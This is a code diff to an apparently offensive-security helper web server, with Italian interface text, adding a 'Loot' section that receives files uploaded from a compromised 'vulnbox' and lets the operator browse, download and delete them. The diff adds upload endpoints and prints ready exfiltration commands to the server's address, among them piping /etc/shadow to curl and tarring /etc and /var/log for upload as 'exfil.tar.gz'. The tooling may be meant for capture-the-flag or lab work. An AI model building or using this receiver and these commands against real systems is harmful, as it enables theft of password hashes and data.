@@ -24,6 +24,7 @@ STATIC_ROOT = PROJECT_ROOT / "static"
 VULN_ROOT = PROJECT_ROOT / "vuln"
 NOTES_ROOT = PROJECT_ROOT / "notes"
 TOOL_ROOT = PROJECT_ROOT / "tool"
+LOOT_ROOT = PROJECT_ROOT / "loot"
 TIPS_FILE = PROJECT_ROOT / "tips.txt"
 SEALSAY_FILE = PROJECT_ROOT / "sealion_say.txt"
 
@@ -636,6 +637,7 @@ def _base_html(title: str, body: str, active: str = "") -> str:
         ("/tools/", "Tools", "tools"),
         ("/static/", "Static", "static"),
         ("/delivery", "Delivery", "delivery"),
+        ("/loot/", "Loot", "loot"),
         ("/logs", "Logs", "logs"),
     ]
     nav_html = ""
@@ -720,6 +722,7 @@ def _page_home() -> str:
     n_vulns = len(_discover_vulns())
     n_tools = len(_discover_tools())
     n_static = len([f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith(".")]) if STATIC_ROOT.is_dir() else 0
+    n_loot = len(_discover_loot())
 
     body = f"""
 <div class="home-layout">
@@ -743,6 +746,7 @@ def _page_home() -> str:
       <li><a href="/vuln/">Vuln</a><span class="cnt">{n_vulns} protocolli</span></li>
       <li><a href="/tools/">Tools</a><span class="cnt">{n_tools} tool</span></li>
       <li><a href="/static/">Static</a><span class="cnt">{n_static} file</span></li>
+      <li><a href="/loot/">Loot</a><span class="cnt">{n_loot} file</span></li>
       <li><a href="/delivery">Delivery</a><span class="cnt">payload &amp; curl</span></li>
       <li><a href="/logs">Logs</a><span class="cnt">server logs</span></li>
     </ul>
@@ -773,6 +777,7 @@ def _page_home() -> str:
     {{name:'vuln',label:'Vuln',cnt:'{n_vulns} protocolli',href:'/vuln/'}},
     {{name:'tools',label:'Tools',cnt:'{n_tools} tool',href:'/tools/'}},
     {{name:'static',label:'Static',cnt:'{n_static} file',href:'/static/'}},
+    {{name:'loot',label:'Loot',cnt:'{n_loot} file',href:'/loot/'}},
     {{name:'delivery',label:'Delivery',cnt:'payload & curl',href:'/delivery'}},
     {{name:'logs',label:'Logs',cnt:'server logs',href:'/logs'}},
   ];
@@ -1118,6 +1123,151 @@ def _extract_search_context(text: str, query_lower: str, max_len: int = 120) -> 
     return ""
 
 
+def _discover_loot() -> list[dict]:
+    if not LOOT_ROOT.is_dir():
+        return []
+    items: list[dict] = []
+    for f in sorted(LOOT_ROOT.iterdir(), key=lambda p: p.name, reverse=True):
+        if not f.is_file() or f.name.startswith("."):
+            continue
+        size = f.stat().st_size
+        if size > 1_048_576:
+            label = f"{size / 1_048_576:.1f} MB"
+        elif size > 1024:
+            label = f"{size / 1024:.1f} KB"
+        else:
+            label = f"{size} B"
+        is_text = False
+        preview = ""
+        try:
+            raw = f.read_bytes()[:512]
+            raw.decode("utf-8", errors="strict")
+            is_text = True
+            preview = raw.decode("utf-8", errors="replace")[:200]
+        except (UnicodeDecodeError, OSError):
+            pass
+        items.append({"name": f.name, "size": label, "bytes": size,
+                       "is_text": is_text, "preview": preview})
+    return items
+
+
+def _save_loot_file(data: bytes, filename: str, client_ip: str) -> str:
+    import time as _time
+    LOOT_ROOT.mkdir(parents=True, exist_ok=True)
+    ts = _time.strftime("%Y-%m-%d_%H-%M-%S")
+    safe_name = Path(filename).name.replace("..", "").replace("/", "").replace("\\", "")
+    if not safe_name:
+        safe_name = "upload"
+    dest_name = f"{client_ip}_{ts}_{safe_name}"
+    dest = LOOT_ROOT / dest_name
+    counter = 1
+    while dest.exists():
+        dest = LOOT_ROOT / f"{client_ip}_{ts}_{counter}_{safe_name}"
+        counter += 1
+    dest.write_bytes(data)
+    return dest.name
+
+
+def _page_loot() -> str:
+    items = _discover_loot()
+
+    if _server is not None:
+        port = _server.server_address[1]
+        base = f"http://{_lhost}:{port}"
+    else:
+        base = ""
+
+    rows = ""
+    for it in items:
+        ename = html.escape(it["name"])
+        preview_html = ""
+        if it["is_text"] and it["preview"]:
+            preview_html = f'<div style="color:var(--text2);font-size:11px;margin-top:4px;white-space:pre-wrap;max-height:60px;overflow:hidden">{html.escape(it["preview"])}</div>'
+        rows += f"""<div class="file-card">
+<div style="min-width:0;flex:1"><div class="fname">{ename}</div>{preview_html}</div>
+<div class="fsize" style="margin:0 12px">{it['size']}</div>
+<div class="actions">
+<a class="btn" href="/loot/view/{ename}">Apri</a>
+<a class="btn" href="/loot/raw/{ename}">Scarica</a>
+<button class="btn btn-danger" onclick="deleteLoot('{ename}')">Elimina</button>
+</div>
+</div>\n"""
+
+    if not items:
+        rows = '<p style="color:var(--text2)">Nessun file ricevuto. Usa <code>curl</code> dalla vulnbox per caricare file.</p>'
+
+    curl_examples = ""
+    if base:
+        curl_examples = f"""<div style="margin:20px 0">
+<h3 style="color:var(--text);margin-bottom:10px">Comandi dalla vulnbox</h3>
+<div class="dc-cmd"><code>curl -F "file=@/path/file" {base}/upload</code></div>
+<div style="color:var(--text2);font-size:12px;margin-bottom:8px">Upload file singolo</div>
+<div class="dc-cmd"><code>cat /etc/shadow | curl -X POST -d @- {base}/upload/shadow.txt</code></div>
+<div style="color:var(--text2);font-size:12px;margin-bottom:8px">Upload via pipe</div>
+<div class="dc-cmd"><code>curl -T /tmp/db.sqlite {base}/upload/db.sqlite</code></div>
+<div style="color:var(--text2);font-size:12px;margin-bottom:8px">Upload con PUT</div>
+</div>"""
+
+    body = f"""<div class="container">
+<div class="breadcrumb"><a href="/">Home</a> <span>/</span> Loot</div>
+<div class="page-title">Loot</div>
+<div class="page-sub">{len(items)} file ricevuti dalla vulnbox</div>
+{curl_examples}
+<div class="btn-group">
+<button class="btn btn-danger" onclick="if(confirm('Eliminare TUTTI i file loot?'))clearLoot()">Svuota loot</button>
+</div>
+{rows}
+</div>
+<script>
+function deleteLoot(name){{
+  if(!confirm('Eliminare '+name+'?'))return;
+  fetch('/api/loot/delete',{{method:'POST',headers:{{'Content-Type':'application/json'}},
+    body:JSON.stringify({{name:name}})}})
+  .then(r=>r.json()).then(d=>{{if(d.ok)location.reload();else alert(d.error);}});
+}}
+function clearLoot(){{
+  fetch('/api/loot/clear',{{method:'POST'}})
+  .then(r=>r.json()).then(d=>{{if(d.ok)location.reload();else alert(d.error);}});
+}}
+</script>"""
+    return _base_html("Loot", body, active="loot")
+
+
+def _page_loot_view(name: str) -> str:
+    fpath = LOOT_ROOT / name
+    is_binary = False
+    content = ""
+    if fpath.is_file():
+        try:
+            content = fpath.read_text(encoding="utf-8", errors="strict")
+        except (UnicodeDecodeError, ValueError):
+            is_binary = True
+
+    ename = html.escape(name)
+
+    if is_binary:
+        size = fpath.stat().st_size
+        if size > 1_048_576:
+            label = f"{size / 1_048_576:.1f} MB"
+        elif size > 1024:
+            label = f"{size / 1024:.1f} KB"
+        else:
+            label = f"{size} B"
+        viewer = f"""<div style="text-align:center;padding:40px 0;color:var(--text2)">
+<p>File binario — {label}</p>
+<a href="/loot/raw/{ename}" class="btn btn-primary" style="margin-top:12px">Scarica</a>
+</div>"""
+    else:
+        viewer = f'<pre style="background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:14px;overflow-x:auto;font-size:12.5px;line-height:1.6;color:var(--text);white-space:pre-wrap;word-break:break-all">{html.escape(content)}</pre>'
+
+    body = f"""<div class="container">
+<div class="breadcrumb"><a href="/">Home</a> <span>/</span> <a href="/loot/">Loot</a> <span>/</span> {ename}</div>
+<div class="page-title" style="word-break:break-all">{ename}</div>
+{viewer}
+</div>"""
+    return _base_html(f"Loot — {name}", body, active="loot")
+
+
 def _page_delivery() -> str:
     if _server is not None:
         port = _server.server_address[1]
@@ -1191,6 +1341,20 @@ def _page_delivery() -> str:
 <tbody>{file_rows}</tbody>
 </table>
 </div>
+<h3 style="margin:24px 0 12px;color:var(--text)">Upload dalla vulnbox (loot)</h3>
+<div class="delivery-card">
+<div class="dc-header"><span class="dc-endpoint">/upload</span><span class="dc-title">Upload File</span></div>
+<div class="dc-desc">Carica file dalla vulnbox verso la cartella <code>loot/</code> del server. I file vengono salvati con timestamp e IP sorgente.</div>
+<div class="dc-cmd"><code>{html.escape(f'curl -F "file=@/path/to/file" {base}/upload')}</code></div>
+<div style="color:var(--text2);font-size:12px;margin:4px 0">Upload file singolo con multipart form</div>
+<div class="dc-cmd"><code>{html.escape(f'cat /etc/shadow | curl -X POST -d @- {base}/upload/shadow.txt')}</code></div>
+<div style="color:var(--text2);font-size:12px;margin:4px 0">Upload via pipe (contenuto come body)</div>
+<div class="dc-cmd"><code>{html.escape(f'curl -T /tmp/database.db {base}/upload/database.db')}</code></div>
+<div style="color:var(--text2);font-size:12px;margin:4px 0">Upload con PUT</div>
+<div class="dc-cmd"><code>{html.escape(f'tar czf - /etc /var/log | curl -X POST -d @- {base}/upload/exfil.tar.gz')}</code></div>
+<div style="color:var(--text2);font-size:12px;margin:4px 0">Esfiltra cartelle intere compressi via tar</div>
+</div>
+<div style="margin-top:8px;font-size:12px;color:var(--text2)">I file sono consultabili nella sezione <a href="/loot/">Loot</a>.</div>
 </div>"""
     return _base_html("Delivery", body, active="delivery")
 
@@ -1399,6 +1563,17 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
                 self._serve_index(pv)
             else:
                 self._send_html(_page_delivery())
+        elif path == "/loot":
+            self._send_html(_page_loot())
+        elif path.startswith("/loot/view/"):
+            name = path[11:]
+            if ".." in name or "/" in name:
+                self.send_error(403)
+            else:
+                self._send_html(_page_loot_view(name))
+        elif path.startswith("/loot/raw/"):
+            name = path[10:]
+            self._serve_loot_raw(name)
         else:
             self._serve_static(path)
 
@@ -1499,6 +1674,19 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
             self._api_delete()
         elif path == "/api/static/upload":
             self._api_upload()
+        elif path == "/upload" or path.startswith("/upload/"):
+            self._api_loot_upload(path)
+        elif path == "/api/loot/delete":
+            self._api_loot_delete()
+        elif path == "/api/loot/clear":
+            self._api_loot_clear()
+        else:
+            self.send_error(404)
+
+    def do_PUT(self) -> None:
+        path = self.path.split("?")[0].rstrip("/")
+        if path.startswith("/upload/"):
+            self._api_loot_upload(path)
         else:
             self.send_error(404)
 
@@ -1568,6 +1756,100 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
             self._send_json({"ok": False, "error": str(e)}, 500)
             return
         self._send_json({"ok": True, "name": name})
+
+    def _api_loot_upload(self, path: str) -> None:
+        client_ip = self.client_address[0]
+        content_type = self.headers.get("Content-Type", "")
+
+        filename_from_path = ""
+        if path.startswith("/upload/"):
+            filename_from_path = path[8:]
+            if ".." in filename_from_path or "/" in filename_from_path:
+                self._send_json({"ok": False, "error": "Nome file non valido"}, 400)
+                return
+
+        if "multipart/form-data" in content_type:
+            import cgi
+            form = cgi.FieldStorage(
+                fp=self.rfile,
+                headers=self.headers,
+                environ={"REQUEST_METHOD": "POST",
+                         "CONTENT_TYPE": content_type},
+            )
+            file_item = form["file"] if "file" in form else None
+            if file_item is None or not file_item.filename:
+                self._send_json({"ok": False, "error": "Nessun file ricevuto"}, 400)
+                return
+            data = file_item.file.read()
+            filename = filename_from_path or Path(file_item.filename).name
+        else:
+            data = self._read_body()
+            if not data:
+                self._send_json({"ok": False, "error": "Body vuoto"}, 400)
+                return
+            filename = filename_from_path or "upload"
+
+        saved = _save_loot_file(data, filename, client_ip)
+        size = len(data)
+        if size > 1_048_576:
+            label = f"{size / 1_048_576:.1f} MB"
+        elif size > 1024:
+            label = f"{size / 1024:.1f} KB"
+        else:
+            label = f"{size} B"
+        self._send_json({"ok": True, "name": saved, "size": label})
+
+    def _api_loot_delete(self) -> None:
+        try:
+            body = json.loads(self._read_body())
+            name = body.get("name", "").strip()
+        except (json.JSONDecodeError, UnicodeDecodeError):
+            self._send_json({"ok": False, "error": "JSON non valido"}, 400)
+            return
+        if not name or ".." in name or "/" in name or "\\" in name:
+            self._send_json({"ok": False, "error": "Nome non valido"}, 400)
+            return
+        target = LOOT_ROOT / name
+        if not target.is_file():
+            self._send_json({"ok": False, "error": "File non trovato"}, 404)
+            return
+        try:
+            target.unlink()
+        except OSError as e:
+            self._send_json({"ok": False, "error": str(e)}, 500)
+            return
+        self._send_json({"ok": True})
+
+    def _api_loot_clear(self) -> None:
+        if not LOOT_ROOT.is_dir():
+            self._send_json({"ok": True, "deleted": 0})
+            return
+        count = 0
+        for f in LOOT_ROOT.iterdir():
+            if f.is_file() and not f.name.startswith("."):
+                f.unlink()
+                count += 1
+        self._send_json({"ok": True, "deleted": count})
+
+    def _serve_loot_raw(self, name: str) -> None:
+        if ".." in name or "/" in name or "\\" in name:
+            self.send_error(403)
+            return
+        target = LOOT_ROOT / name
+        if not target.is_file():
+            self.send_error(404, f"File non trovato: {name}")
+            return
+        try:
+            data = target.read_bytes()
+        except OSError:
+            self.send_error(500)
+            return
+        self.send_response(200)
+        self.send_header("Content-Type", "application/octet-stream")
+        self.send_header("Content-Length", str(len(data)))
+        self.send_header("Content-Disposition", f'attachment; filename="{target.name}"')
+        self.end_headers()
+        self.wfile.write(data)
 
 
 class _QuietTCPServer(socketserver.TCPServer):
@@ -1773,3 +2055,56 @@ def list_static() -> str:
         else:
             lines.append(f"  curl {base}/{name} -o {name} && chmod +x {name}")
     return "\n".join(lines)
+
+
+def list_loot() -> str:
+    if _server is not None:
+        port = _server.server_address[1]
+        base = f"http://{_lhost}:{port}"
+    else:
+        base = "http://<LHOST>:2727"
+
+    items = _discover_loot()
+    if not items:
+        lines = [
+            "\n\033[1mLoot:\033[0m\n  Nessun file ricevuto.",
+            "",
+            "\033[1mComandi dalla vulnbox:\033[0m",
+            f'  curl -F "file=@/path/file" {base}/upload',
+            f"  cat /etc/shadow | curl -X POST -d @- {base}/upload/shadow.txt",
+            f"  curl -T /tmp/db.sqlite {base}/upload/db.sqlite",
+        ]
+        return "\n".join(lines)
+
+    lines = [f"\n\033[1mLoot ({len(items)} file):\033[0m"]
+    for i, it in enumerate(items, 1):
+        preview = ""
+        if it["is_text"] and it["preview"]:
+            first_line = it["preview"].splitlines()[0][:60]
+            preview = f"  \033[90m{first_line}\033[0m"
+        lines.append(f"  [{i}] {it['name']}  ({it['size']})")
+        if preview:
+            lines.append(f"      {preview}")
+    lines.append(f"\n  Cartella: {LOOT_ROOT}")
+    return "\n".join(lines)
+
+
+def read_loot(name: str) -> str | None:
+    target = LOOT_ROOT / name
+    if not target.is_file():
+        return None
+    try:
+        return target.read_text(encoding="utf-8", errors="replace")
+    except OSError:
+        return None
+
+
+def clear_loot() -> str:
+    if not LOOT_ROOT.is_dir():
+        return "Nessun file loot da eliminare."
+    count = 0
+    for f in LOOT_ROOT.iterdir():
+        if f.is_file() and not f.name.startswith("."):
+            f.unlink()
+            count += 1
+    return f"Eliminati {count} file dalla cartella loot/."
